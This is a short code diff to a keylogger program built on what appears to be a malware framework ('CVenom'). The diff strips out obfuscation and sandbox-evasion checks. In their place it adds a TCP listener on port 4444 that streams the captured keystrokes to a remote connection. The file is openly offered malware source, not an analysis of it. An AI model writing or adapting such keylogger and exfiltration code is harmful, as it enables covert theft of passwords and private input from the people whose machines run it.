@@ -1,26 +1,17 @@
 #include <CVenom.h>
-#include <ObfuscationTools.h>
 #include <KeyboardTools.h>
-#include <EvasionTools.h>
+#include <NetworkTools.h>
 
 int main(MALWARE_ENTRY){
         cvinit(MALWARE_INIT);
 
         KeyboardTools Keyboard;
-        EvasionTools    Evador;
-        ObfuscationTools Obfuscator;
+	NetworkTools Network;
 
-        Obfuscator.ObfuscateExecution();
+	Network.TCPServer("*", 4444);
 
-        if (Evador.CheckDynamicAnalysis() > 0)
-                cvexit(0x00);
-
-        Obfuscator.ObfuscateExecution();
         Keyboard.GetEventFile();
-        Obfuscator.ObfuscateExecution();
-        Keyboard.OutputTo("Test_Wala_test.txt");
-        Obfuscator.ObfuscateExecution();
-        Keyboard.Run();
+	Keyboard.StreamKeystrokes(Network.Socket());
 
         cvexit(MALWARE_EXIT);
 }
